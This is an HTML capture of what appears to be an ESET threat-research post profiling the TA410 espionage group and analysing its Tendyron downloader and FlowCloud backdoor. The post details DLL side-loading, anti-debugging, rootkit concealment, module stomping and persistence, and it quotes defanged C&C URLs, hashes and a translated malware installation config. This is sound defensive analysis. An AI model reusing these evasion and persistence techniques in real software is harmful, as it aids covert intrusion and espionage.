@@ -1,0 +1,927 @@
+<div>
+Share
+<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2022%2F04%2F27%2Flookback-ta410-umbrella-cyberespionage-ttps-activity%2F" target="blank">
+</a>
+<a class="share-twitter" href="https://twitter.com/intent/tweet?&amp;url=https%3A%2F%2Fwww.welivesecurity.com%2F2022%2F04%2F27%2Flookback-ta410-umbrella-cyberespionage-ttps-activity%2F&amp;text=A%20lookback%20under%20the%20TA410%20umbrella:%20Its%20cyberespionage%20TTPs%20and%20activity%0A&amp;via=welivesecurity" target="blank">
+</a>
+<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fwww.welivesecurity.com%2F2022%2F04%2F27%2Flookback-ta410-umbrella-cyberespionage-ttps-activity%2F" target="blank">
+</a>
+<p>ESET researchers reveal a detailed profile of TA410: we believe this cyberespionage umbrella group consists of three different teams using different toolsets, including a new version of the FlowCloud espionage backdoor discovered by ESET.</p>
+<p>ESET researchers have documented and analyzed TA410 activity going back to 2019. TA410 is a cyberespionage umbrella group loosely linked to APT10, known mostly for targeting US-based organizations in the utilities sector, and diplomatic organizations in the Middle East and Africa. TA410 has been active since at least 2018 and was first publicly revealed in August 2019 by Proofpoint in its <a href="https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks" rel="noopener" target="_blank">LookBack blogpost</a>. A year later, the then-new and very complex malware family called <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" rel="noopener" target="_blank">FlowCloud</a> was also attributed to TA410.</p>
+<p>In this blogpost, we provide a detailed profile of this APT group, including its modus operandi and toolset that includes a new version of FlowCloud, discovered by ESET. This very complex backdoor contains interesting espionage capabilities. ESET will present its latest findings about TA410, including results from ongoing research, during <a href="https://www.botconf.eu/" rel="noopener" target="_blank">Botconf 2022</a>. For YARA and Snort rules, consult <a href="https://github.com/eset/malware-ioc" rel="noopener" target="_blank">ESET’s GitHub account</a>.</p>
+<p></p>Key points in this blogpost:<p></p>
+<ul>
+<li>TA410 is an umbrella group comprised of three teams ESET researchers named FlowingFrog, LookingFrog and JollyFrog, each with its own toolset and targets.</li>
+<li>ESET telemetry shows victims all around the world, mainly in the governmental and education sectors.</li>
+<li>TA410 had access to the most recent known Microsoft Exchange remote code execution vulnerabilities, e.g., <a href="https://www.welivesecurity.com/2021/03/10/exchange-servers-under-siege-10-apt-groups/" rel="noopener" target="_blank">ProxyLogon</a> in March 2021 and <a href="https://www.welivesecurity.com/wp-content/uploads/2022/02/eset_threat_report_t32021.pdf" rel="noopener" target="_blank">ProxyShell</a> in August 2021.</li>
+<li>ESET researchers found a new version of FlowCloud, a complex and modular C++ RAT. It has several interesting capabilities, including:
+<ul>
+<li>Controlling connected microphones and triggering recording when sound levels above a specified threshold volume are detected.</li>
+<li>Monitoring clipboard events to steal clipboard content.</li>
+<li>Monitoring file system events to collect new and modified files.</li>
+<li>Controlling attached camera devices to take pictures of the compromised computer’s surroundings.</li>
+</ul>
+</li>
+<li>FlowCloud deploys a rootkit to hide its activity on the compromised machine.</li>
+<li>The LookBack backdoor utilized by TA410 uses a custom network protocol, which can function over HTTP or raw TCP, for C&amp;C server communications.</li>
+<li>TA410 is one of the users of the Royal Road malicious document builder.</li></ul>
+<p>TA410 teams compromise their targets in various ways, which indicates to us that those victims are targeted specifically, with the attackers choosing which entry method has the best chance of infiltrating the target.</p>
+<p>The first stage of the FlowCloud version identified by ESET researchers can check whether specific security software is installed on the machine it tries to compromise, but this isn’t implemented in the loaders we analyzed. However, we found a custom AntivirusCheck class, which can check running processes against a hardcoded list of executable filenames from known security products, including ESET products. In case one of these products is detected, FlowCloud goes through its regular loading process and cancels the auto_start_after_install configuration value.</p>
+<p>Even though we believe that this version of FlowCloud is still undergoing development and testing, the cyberespionage capabilities of this version include the ability to collect mouse movements, keyboard activity, and clipboard content along with information about the current foreground window. This information can help attackers understand stolen data by contextualizing it.</p>
+<p>FlowCloud can also gather information about things happening around the victim’s computer by taking pictures using connected camera peripherals and recording audio using a computer’s microphone. This latter function is triggered by any sound over a threshold of 65 decibels, which is in the upper range of normal conversation volume.</p>
+<h2>Attribution</h2>
+<p>ESET researchers believe that TA410 is composed of three different teams, using very similar tactics, techniques, and procedures (TTPs) but different toolsets and exiting from IP addresses located in three different districts. These teams, referred to below as FlowingFrog, LookingFrog, and JollyFrog, have overlaps in TTPs, victimology and network infrastructure.</p>
+<ul>
+<li>FlowingFrog uses <a href="https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html" rel="noopener" target="_blank">Royal Road RTF documents</a>, a first-stage implant called Tendyron, and a very complex second-stage backdoor called FlowCloud.</li>
+<li>LookingFrog uses a first-stage backdoor called X4, and LookBack as a second stage.</li>
+<li>JollyFrog uses only generic malware families such as Korplug (aka PlugX) and QuasarRAT. Part of the activity of this team was described by <a href="https://www.fortinet.com/blog/threat-research/uncovering-new-activity-by-apt-" rel="noopener" target="_blank">Fortinet</a>, who attributed the activity to APT10. ESET researchers, however, believe this activity is different from the operations that <a href="https://securelist.com/apt10-sophisticated-multi-layered-loader-ecipekac-discovered-in-a41apt-campaign/101519/" rel="noopener" target="_blank">APT10</a> (aka A41APT) has conducted recently.</li>
+</ul>
+<p>FlowingFrog and JollyFrog share network infrastructure – more precisely, the domain ffca.caibi379[.]com, as mentioned by <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" rel="noopener" target="_blank">Proofpoint</a>.</p>
+<p>FlowingFrog and LookingFrog ran a phishing campaign at the same time against the same targets, as also mentioned in the same Proofpoint article.</p>
+<p>In ESET telemetry, we do not see any other overlap between these subgroups. We believe that these subgroups operate somewhat independently but that they may share intelligence requirements, an access team that runs their spearphishing campaigns, and also the team that deploys network infrastructure.</p>
+<h2>Victimology</h2>
+<p>Most TA410 targets are high-profile organizations in the diplomacy and education sectors, but we have also seen victims in the military sector, a manufacturing company in Japan, a mining company in India, and a charity in Israel. According to ESET telemetry, the victims are located in Africa, Asia, the Middle East, and Europe. Interestingly, there is no clear segmentation of the targeting (by sector or geography) among the different teams.</p>
+<p>An element worth mentioning is that TA410 targets foreign individuals in China. In ESET telemetry, we have observed this as having happened at least twice: for instance, one victim is a French academic, and another is a member of a diplomatic mission of a South Asian country in China.</p>
+<p>Since 2018, we have seen the following targets, also depicted in Figure 1:</p>
+<ul>
+<li>FlowingFrog: University, foreign diplomatic mission of a South Asian country in China, mining company</li>
+<li>LookingFrog: Diplomatic missions, charity, government and industrial manufacturing</li>
+<li>JollyFrog: Education, church, military, diplomatic mission</li>
+</ul>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-1.-Map-of-countries-and-verticals-targeted-by-TA410.png"><img alt="" class="wp-image-161821" height="464" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-1.-Map-of-countries-and-verticals-targeted-by-TA410-300x155.png" style="max-width:800px;height:auto;width:auto;" width="900"/></a><p>Figure 1. Map of countries and verticals targeted by TA410</p>
+<h2>Initial compromise and typical TTPs</h2>
+<p>If we exclude the different backdoors, the three teams use a similar modus operandi. They compromise their targets either by spearphishing, according to Proofpoint, or, for LookingFrog and JollyFrog, by compromising a web-facing application such as Microsoft Exchange or SharePoint. This could indicate that victims are targeted specifically, with the attackers choosing which entry method is the best for a given target.</p>
+<p>The public-facing application compromise approach is what we have seen the most. Attackers linked to LookingFrog exploited Microsoft SharePoint servers in 2019 to gain code execution, probably by leveraging <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0604" rel="noopener" target="_blank">CVE-2019-0604</a>. They then dropped an ASPX webshell that was used to install other malicious components. These were either dropped directly via the webshell or downloaded from a remote server using <a href="https://lolbas-project.github.io/lolbas/Binaries/Certutil/" rel="noopener" target="_blank">certutil.exe</a>, a known <a href="https://github.com/LOLBAS-Project/LOLBAS#user-content-the-history-of-the-lolbin" rel="noopener" target="_blank">LOLBin</a>.</p>
+<p>In 2020, we saw further exploitations by JollyFrog, of Microsoft SQL servers and IIS servers running custom applications.</p>
+<p>In August 2021, we observed LookBack being loaded by an IIS worker process on a server belonging to an industrial manufacturing company in Japan. This happened following the exploitation of the Exchange ProxyShell vulnerability on that server, as we describe in <a href="https://www.welivesecurity.com/wp-content/uploads/2022/02/eset_threat_report_t32021.pdf#T3-2021_Threat-report_final-update.indd%3A.262857%3A2610" rel="noopener" target="_blank">ESET Threat Report T3 2021</a>.</p>
+<p>This shows that LookingFrog operators closely follow the discovery of RCE vulnerabilities in popular server applications and quickly make use of any available exploit in order to gain control of unpatched servers run by organizations on their target lists.</p>
+<p>In addition to the full-featured backdoors analyzed in the following sections, these attackers use a variety of tools such as vulnerability scanners, exploits from the Equation Group leaks, proxy/tunneling utilities (<a href="https://cyber.gc.ca/en/guidance/c2-obfuscation-tools-htran" rel="noopener" target="_blank">HTran</a>, <a href="https://github.com/UndefinedIdentifier/LCX" rel="noopener" target="_blank">LCX</a>, <a href="https://github.com/rootkiter/EarthWorm" rel="noopener" target="_blank">EarthWorm</a>), and lateral movement scripts such as <a href="https://jpcertcc.github.io/ToolAnalysisResultSheet/details/wmiexec-vbs.htm" rel="noopener" target="_blank">WMIExec</a>.</p>
+<h2>Arsenal</h2>
+<h3>TA410 – FlowingFrog</h3>
+<p>FlowingFrog uses a first stage that ESET researchers have named the Tendyron downloader, and a complex second stage named FlowCloud, so named by the developers in its modules’ PDB paths.</p>
+<h4>Royal Road and Tendyron downloader</h4>
+<p>Royal Road is a malicious document builder used by several cyberespionage groups (<a href="https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html" rel="noopener" target="_blank">see the analysis by nao_sec</a>). Files built with this tool are RTF documents exploiting Equation Editor N-day vulnerabilities such as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882" rel="noopener" target="_blank">CVE-2017-11882</a>. TA410 operators always use the Royal Road encoding bytes: A9 A4 6E FE, as seen in Figure 2.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-2.-Encoded-Royal-Road-payload.png"><img alt="" class="wp-image-161822" height="303" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-2.-Encoded-Royal-Road-payload-300x101.png" style="max-width:800px;height:auto;width:auto;" width="900"/></a><p>Figure 2. Encoded Royal Road payload</p>
+<p>On October 13th 2020, we noticed that a new Royal Road RTF document, shown in Figure 3, had been uploaded to <a href="https://www.virustotal.com/gui/file/c88d0f7d623b2a2c066dd6b15597d1f4c44d89e7a8e660e28c3494f441826ea5" rel="noopener" target="_blank">VirusTotal</a>.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-3.-Royal-Road-RTF-document-found-on-VirusTotal-SHA-1-ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20.png"><img alt="" class="wp-image-161823 size-full" height="685" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-3.-Royal-Road-RTF-document-found-on-VirusTotal-SHA-1-ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20.png" style="max-width:800px;height:auto;width:auto;" width="752"/></a><p>Figure 3. Royal Road RTF document found on VirusTotal (SHA‑1: ADD5B4FD9AEA6A38B5A8941286BC9AA4FE23BD20)</p>
+<p>When opened, the document triggers the injection of a custom downloader – a PE executable – into an iexplore.exe process. The PE resources 103, 104 and 105 contain the payload URLs, XORed with 0xD3. The following files are downloaded and written to disk:</p>
+<ul>
+<li>http://103.139.2[.]93:1702/tdr.dat written to %localappdata%\Tendyron\Tendyron.exe
+(SHA-1: 09C76522136B5E9BAB74381FEEE265F7E9B1D550)</li>
+<li>http://103.139.2[.]93:1702/okt.dat written to %localappdata%\Tendyron\OnKeyToken_KEB.dll (SHA‑1: F359D3C074135BBCA9A4C98A6B6544690EDAE93D)</li>
+<li>http://103.139.2[.]93:1702/md.dat written to %localappdata%\Tendyron\Tendyron.conf
+(we were not able to retrieve this file)</li>
+</ul>
+<p>Finally, this process separately downloads http://103.139.2[.]93:1702/t86.dat (resource 101), loads it into memory, and calls its startModule export. Unfortunately, we were not able to retrieve this sample.</p>
+<p>Tendyron.exe is a legitimate executable, signed by online-banking security vendor Tendyron Corporation, and that is vulnerable to DLL search-order hijacking. Persistence for the downloaded payload is established via the Tendyron value under the Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.</p>
+<p>When executed, Tendyron.exe loads the malicious OnKeyToken_KEB.dll. The export OnKeyT_ContextInit contains code that decrypts hardcoded shellcode (see Figure 4) and injects it into iexplore.exe using WriteProcessMemory.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-4.-Shellcode-decryption-loop.png"><img alt="" class="wp-image-161824" height="175" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-4.-Shellcode-decryption-loop-300x88.png" width="600"/></a><p>Figure 4. Shellcode decryption loop</p>
+<p>The next stage, injected into iexplore.exe, is a backdoor written using the Microsoft Foundation Class (MFC) framework. It also contains RTTI symbols and thus a few C++ class names:</p>
+<ul>
+<li>ClientSocket</li>
+<li>Manager</li>
+<li>DllManager</li>
+<li>KernelManager</li>
+</ul>
+<p>These class names are the same as used in Farfli/Gh0stRAT, a backdoor that has been used for more than 10 years to conduct (mostly) cyberespionage operations. Its source code was leaked and is now available on <a href="https://github.com/sin5678/gh0st">GitHub</a>. Thus, we believe that TA410 developers reused code copied from Farfli.</p>
+<p>The C&amp;C server is hardcoded, in cleartext, in the sample; in this specific case, it is set to 114.118.83[.]141.</p>
+<p>On VirusTotal, as shown in Figure 5, we can see one more HTTP request to 103.139.2[.]93 was triggered during the execution of the RTF file. The result of the request to http://103.139.2[.]93:1702/SL3716/S8437AEB.DAT was recorded by VirusTotal and the SHA-1 of this encrypted file is 140F81037A76B7B16A00E1D5E0E2CD9F6687F642. This URI is typical of those used to download FlowCloud, a complex C++ implant described in the next section.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-5.-URL-requests-seen-by-the-VirusTotal-sandbox-during-execution-of-the-malicious-RTF-document.png"><img alt="" class="wp-image-161825" height="669" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-5.-URL-requests-seen-by-the-VirusTotal-sandbox-during-execution-of-the-malicious-RTF-document-300x223.png" style="max-width:800px;height:auto;width:auto;" width="900"/></a><p>Figure 5. URL requests seen by the VirusTotal sandbox during execution of the malicious RTF document</p>
+<p>The identical encrypted file was also downloaded from http://114.55.109[.]199:56022/SL3716/S8437AEB.DAT by a FlowCloud dropper version 4.1.3 (SHA‑1: 014421BDB1EA105A6DF0C27FC114819FF3637704). A summary of the compromise chain is provided in Figure 6.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-6.-Compromise-chain-from-the-Royal-Road-document-to-FlowCloud.png"><img alt="" class="wp-image-161826" height="952" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-6.-Compromise-chain-from-the-Royal-Road-document-to-FlowCloud.png" style="max-width:800px;height:auto;width:auto;" width="750"/></a><p>Figure 6. Compromise chain from the Royal Road document to FlowCloud</p>
+<h4>FlowCloud</h4>
+<p>FlowCloud is a complex implant written in C++. It consists of three main components, deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis. Multiple versions of FlowCloud have been identified since 2020, most notably versions <a href="https://www.proofpoint.com/us/blog/threat-insight/flowcloud-version-413-malware-analysis" rel="noopener" target="_blank">4.1.3</a> and <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" rel="noopener" target="_blank">5.0.1</a> described by Proofpoint. In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3. Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.</p>
+<p>This deployment process is very similar to the one described by <a href="https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new" rel="noopener" target="_blank">Proofpoint</a> for version 5.0.1. The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor. We describe these in detail in the upcoming sections.</p>
+<h4>Loader (ClientLdrExe)</h4>
+<p>The first stage is responsible mostly for creating the files and registry keys used by the other stages. The values for these executables and configuration data can be found, encrypted, in the loader’s resource section. Table 1 contains an overview of these resources and their use.</p>
+<p>Table 1. Contents of the dropper’s resources</p>
+<table class="tablepress tablepress-id-1121" id="tablepress-1121">
+<thead>
+<tr class="row-1 odd">
+<th class="column-1">Resource ID</th><th class="column-2">Role</th><th class="column-3">Internal name</th>
+</tr>
+</thead>
+<tbody class="row-hover">
+<tr class="row-2 even">
+<td class="column-1">100</td><td class="column-2">FlowCloud RAT DLL</td><td class="column-3">fcClientDll </td>
+</tr>
+<tr class="row-3 odd">
+<td class="column-1">101</td><td class="column-2">32-bit rootkit driver</td><td class="column-3">Driver</td>
+</tr>
+<tr class="row-4 even">
+<td class="column-1">102</td><td class="column-2">64-bit rootkit driver</td><td class="column-3">Driver</td>
+</tr>
+<tr class="row-5 odd">
+<td class="column-1">103</td><td class="column-2">DLL hijacking vulnerable app</td><td class="column-3">N/A</td>
+</tr>
+<tr class="row-6 even">
+<td class="column-1">104</td><td class="column-2">Shellcode loaded by the malicious library in the DLL hijacking</td><td class="column-3">SETLANG_dlcore</td>
+</tr>
+<tr class="row-7 odd">
+<td class="column-1">105</td><td class="column-2">Shellcode that loads fcClient (unused)</td><td class="column-3">N/A</td>
+</tr>
+<tr class="row-8 even">
+<td class="column-1">106</td><td class="column-2">Final dropper stage</td><td class="column-3">fcClient</td>
+</tr>
+<tr class="row-9 odd">
+<td class="column-1">107</td><td class="column-2">32-bit persistence module</td><td class="column-3">fcClientWD_x86</td>
+</tr>
+<tr class="row-10 even">
+<td class="column-1">108</td><td class="column-2">64-bit persistence module</td><td class="column-3">fcClientWD_x64</td>
+</tr>
+<tr class="row-11 odd">
+<td class="column-1">109</td><td class="column-2">Legitimate library used for module stomping</td><td class="column-3">slam</td>
+</tr>
+<tr class="row-12 even">
+<td class="column-1">110</td><td class="column-2">DLL used for hijacking</td><td class="column-3">XXXModule_dlcore0</td>
+</tr>
+<tr class="row-13 odd">
+<td class="column-1">1000</td><td class="column-2">Protobuf serialized FlowCloud configuration</td><td class="column-3">N/A</td>
+</tr>
+<tr class="row-14 even">
+<td class="column-1">1001</td><td class="column-2">Dropper configuration</td><td class="column-3">N/A</td>
+</tr>
+<tr class="row-15 odd">
+<td class="column-1">2000</td><td class="column-2">Used as an alternative or extension to resource 2001</td><td class="column-3">N/A</td>
+</tr>
+<tr class="row-16 even">
+<td class="column-1">2001</td><td class="column-2">Path to the registry key for the PrintProcessor service (used by the driver)</td><td class="column-3">N/A</td>
+</tr>
+<tr class="row-17 odd">
+<td class="column-1">10000</td><td class="column-2">Installation configuration</td><td class="column-3">N/A</td>
+</tr>
+</tbody>
+</table>
+<p>In the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed. In some cases, they are then re-encrypted but with a different key. This technique makes it harder to dump the plaintext values from the process’s memory and to analyze exit dumps. The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration. The samples we analyzed all store their files in the %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\ directory; we believe that this is the default value. FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g., rebare.dll which could be mistaken for rebar.dll) or innocuous looking (e.g., AC146142) to avoid suspicion.</p>
+<p>Figure 7 presents a graphical overview of the deployment process and its elements. We explain each of the steps in further detail in the upcoming sections.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-7.-FlowCloud-deployment-process.png"><img alt="" class="wp-image-161827" height="1002" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-7.-FlowCloud-deployment-process-225x300.png" style="max-width:800px;height:auto;width:auto;" width="750"/></a><p>Figure 7. FlowCloud deployment process</p>
+<p>First, the loader decrypts and parses the embedded installation configuration, which uses the Windows INI format. This configuration defines the malware’s install path along with the filename or registry key where each embedded resource is to be written. The same values are hardcoded in the following stages, which leads us to think that the samples are generated using a builder. In a sample we analyzed, this configuration is accompanied with comments explaining the values for some sections. Figure 8 shows this installation configuration with the comments translated to English.</p>
+<table class="crayon-table">
+<tbody><tr class="crayon-row">
+<td class="crayon-nums">
+12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970
+</td>
+<td class="crayon-code">#Product name, these will be used in the configuration generator and applied to the front end[product]product_chs_name=Sky Arrowproduct_name=PCArrowIproduct_version=v5.0.2 [general]created_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msoleinstall_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msoledata_folder=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\fcdata hide_user_activity_tab = 0 #File path, not including drive letter[file]100=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\responsor.dat103=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlang.exe104=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dat#105=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rebare.dat106=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure.dat107=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure86.dat108=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\rescure64.dat109=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\sspisrvui.dat110=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\setlangloc.dll101=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E86F36C4102=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\AC1461421000=:\Program Files\MSBuild\Microsoft\Expression\Blend\msole\E19D9D4B #0x0001 Release without decryption#0x0002 Decryption release[file_out_type]100=0x0001103=0x0002104=0x0002#105=0x0002106=0x0002107=0x0002108=0x0002109=0x0002110=0x0002101=0x0001102=0x00011000=0x0001 ##Registry path: separated by'|', respectively representing HKEY_LOCAL_MACHINE, path name, value name[key]##100=0x80000002|SYSTEM\Setup\PrintResponsor|1#101=0x80000002|SYSTEM\Setup\PrintResponsor|2#102=0x80000002|SYSTEM\Setup\PrintResponsor|3#1000=0x80000002|SYSTEM\Setup\PrintResponsor|4##2000=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1##2001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|22001=0x80000002|SYSTEM\Setup\AllowStart\ceipCommon|1 ##0x0001 Release without decryption##0x0002 Decryption release[key_out_type]##100=0x0001#101=0x0001#102=0x0001#1000=0x0001#2000=0x00022001=0x0002 #Service Information: hhw.exe needs to be dynamically generated[service_attribute]is_hhw=0service_name=PrintResponsorservice_path=%ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\setlang.exeservice_parm=</td>
+</tr>
+</tbody></table>
+<p>Figure 8. Installation configuration with explanatory comments. Note that some fields are commented out.</p>
+<p>The configuration can also contain a section defining specific security software to check for, but this isn’t implemented in the loaders we analyzed. However, there is a custom AntivirusCheck class, which can check running processes against a hardcoded list of XOR-encrypted executable filenames from known security products: 360 Total Security, Avast, Avira, AVG, Bitdefender, ESET, Jiangmin Technology Antivirus, Kingsoft, McAfee, Micropoint, Norton, Rising Antivirus, and Trend Micro. This class is only used if the loader is set to directly start the fcClient module via the auto_start_after_install configuration key.</p>
+<p>Depending on the configuration keys used, the loader can either load the fcClientDll RAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task. In the former case, the task or service attains persistence by being set to start automatically on boot. In the samples we observed, the task or service was configured to execute the next step of the installation process by running a legitimate application vulnerable to DLL search-order hijacking. The application and the accompanying relevant and malicious DLL were both embedded in the loader’s resources.</p>
+<h4>DLL side-loading (XXXModule_dlcore0)</h4>
+<p>In the samples we analyzed, the vulnerable application was either setlang.exe from Microsoft Office 2003 with a malicious setlangloc.dll or vpreview.exe from Visio Preview 2007 with a malicious vviewres.dll. Strings contained in the malicious DLL also point to emedres.dll from Emurasoft’s EmEditor as a possible third target for DLL side-loading. This is a real possibility as such vulnerabilities were present in older versions of EmEditor, but we did not see any samples using it.</p>
+<p>In all observed samples, the malicious library is the same and serves to load and execute shellcode from a file that is stored under the same name as the DLL, but with a .dat extension. We analyze this shellcode in the next section, but first, we want to look at the notable anti-analysis techniques used in this library.</p>
+<p>Despite its relatively simple goals, the library’s code makes heavy use of anti-debugging tricks and control flow obfuscation to hinder analysis. In the function that loads the next file, the useful code is repeatedly interspersed with the same sequence of opcodes to obfuscate the program’s flow. As shown in Figure 9, this short snippet is packed full of anti-analysis tricks, but ultimately amounts to an unconditional 16-byte jump. This is enough to foil many automatic analyses, including decompilers.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-9.-Annotated-disassembly-of-the-control-flow-obfuscation-snippet-1.png"><img alt="" class="wp-image-161885" height="232" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-9.-Annotated-disassembly-of-the-control-flow-obfuscation-snippet-1-300x77.png" style="max-width:800px;height:auto;width:auto;" width="900"/></a><p>Figure 9. Annotated disassembly of the control flow obfuscation snippet</p>
+<p>The above snippet is bookended by calls to two anti-debugging functions, as can be seen in Figure 10. The function, which we named crash_if_debugger in the previous screenshot, calls IsDebuggerPresent and checks some commonly hooked library functions for a breakpoint as their first instruction. If those checks detect a debugger, the function returns a value that will cause the program to jump to an invalid address and crash. The second one raises an exception via the INT 0x2D instruction and exits if it was handled by a debugger.</p>
+<a class="fancybox" href="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Decompiler-view-showing-the-obvious-pattern-of-anti-debugging-checks.-Note-that-we-had-to-remove-the-aforementioned-obfuscation-for-the-decompiler-to-produce-any-output..png"><img alt="" class="wp-image-161829 size-full" height="366" src="https://www.welivesecurity.com/wp-content/uploads/2022/04/Figure-10.-Decompiler-view-showing-the-obvious-pattern-of-anti-debugging-checks.-Note-that-we-had-to-remove-the-aforementioned-obfuscation-for-the-decompiler-to-produce-any-output..png" width="579"/></a><p>Figure 10. Decompiler view showing the obvious pattern of anti-debugging checks. Note that we had to remove the aforementioned obfuscation for the decompiler to produce any output.</p>
+<h4>fcClient (rescure.dat)</h4>
+<p>When it is first executed, this module sets up persistence and installs the backdoor, rootkit, and persistence modules. It then sets specific registry keys and files as guardrails to skip the setup on subsequent runs.</p>
+<p>First, persistence is established by using the ITaskService COM interface to create the \Microsoft\Windows\CertificateServicesClient\NetTask scheduled task. If a task with the same name already exists, it is deleted before the new one is created. This task will run the DLL hijacking target as SYSTEM at each boot.</p>
+<p>Afterwards, the rootkit module is decrypted and written to the %System%\drivers folder as hidmouse.sys. A hidmouse service is then created to run that module and is immediately started. The file is then deleted from the disk and replaced by a copy of the legitimate hidusb.sys driver from the same folder. Thus, anyone looking at the file on disk rather than the one mapped into memory would see a legitimate, benign file.</p>
+<p>On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013. Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers.</p>
+<p>The following files are copied to the %System% directory:</p>
+<ul>
+<li>The backdoor: rescure.dat</li>
+<li>A decoy DLL: sspisrvui.dat as sspisrvui.dll (<a href="https://attack.mitre.org/versions/v9/techniques/T1070/006/" rel="noopener" target="_blank">timestomped</a> to July 2013)</li>
+<li>The encrypted shellcode: rebare.dat</li>
+</ul>
+<p>The rebare.dat shellcode is very similar to that used in the self-decrypting DLL, but it loads fcClient directly.</p>
+<p>FlowCloud then starts a suspended process to perform injection on it. This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session.</p>
+<p>The injected code loads the same backdoor (rescure.dat) into the process’s memory and calls its startModule export to finish the installation. Meanwhile, the injection process is terminated.</p>
+<p>At this point, installation of the backdoor is complete. All that is left is to execute the backdoor. To achieve this, the new process loads the decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as <a href="https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/" rel="noopener" target="_blank">module stomping</a> or DLL hollowing), before calling its main function.</p>
+<h4>fcClientDll (responsor.dat)</h4>
+<p>This complex module is the main component of the backdoor. It provides a wide range of capabilities from full file system access to control of camera peripherals and everything in between. Although we did not observe any plug-ins, the backdoor contains code that hints that they can be used to further extend functionality.</p>
+<p>Before diving deeper into the functionalities, we want to highlight some notable characteristics:</p>
+<ul>
+<li>Configuration information and data for communications with the C&amp;C server are <a href="https://github.com/protocolbuffers/protobuf" rel="noopener" target="_blank">Protobuf</a>-serialized, compressed, and encrypted.</li>
+<li>File exfiltration is done through encrypted, Protobuf-serialized structures and is disguised as HTTP by prepending the data with a hardcoded, fake POST request. The Content-Length header is the only variable element, as it is set to the actual size of the data sent. This hardcoded request can be seen in Figure 11.</li>
+<li>Multiple functionalities are implemented through the use of COM objects and interfaces.</li>
+</ul>
+<p></p>
+<table class="crayon-table">
+<tbody><tr class="crayon-row">
+<td class="crayon-nums">
+12345678910111213
+</td>
